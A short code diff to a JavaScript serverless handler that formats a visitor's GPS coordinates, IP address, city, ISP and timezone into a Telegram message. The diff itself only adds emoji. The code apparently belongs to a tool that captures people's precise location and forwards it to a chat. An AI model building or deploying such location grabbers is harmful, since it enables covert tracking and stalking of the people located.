@@ -50,20 +50,20 @@ module.exports = async (req, res) => {
       }
 
       // Prepare IP info message
-      let ipInfoMessage = `📍 <b>New Location Received!</b>\n\n`;
+      let ipInfoMessage = `📌 <b>New Location Received!</b>\n\n`;
       ipInfoMessage += `🛰 <b>GPS Coordinates:</b>\n`;
-      ipInfoMessage += `Latitude: ${latitude}\n`;
-      ipInfoMessage += `Longitude: ${longitude}\n`;
-      ipInfoMessage += `Accuracy: ${accuracy || 'N/A'} meters\n\n`;
+      ipInfoMessage += `📍 Latitude: ${latitude}\n`;
+      ipInfoMessage += `📍 Longitude: ${longitude}\n`;
+      ipInfoMessage += `➿ Accuracy: ${accuracy || 'N/A'} meters\n\n`;
 
       if (ip) {
         ipInfoMessage += `🌐 <b>Network Information:</b>\n`;
-        ipInfoMessage += `IP: ${ip}\n`;
-        ipInfoMessage += `Country: ${country}\n`;
-        ipInfoMessage += `Region: ${region}\n`;
-        ipInfoMessage += `City: ${city}\n`;
-        ipInfoMessage += `ISP: ${isp}\n`;
-        ipInfoMessage += `Timezone: ${timezone}\n`;
+        ipInfoMessage += `〽️ IP: ${ip}\n`;
+        ipInfoMessage += `🌐 Country: ${country}\n`;
+        ipInfoMessage += `🔹️ Region: ${region}\n`;
+        ipInfoMessage += `🗺 City: ${city}\n`;
+        ipInfoMessage += `📶 ISP: ${isp}\n`;
+        ipInfoMessage += `🌍 Timezone: ${timezone}\n`;
       }
 
       // Send IP info to Telegram
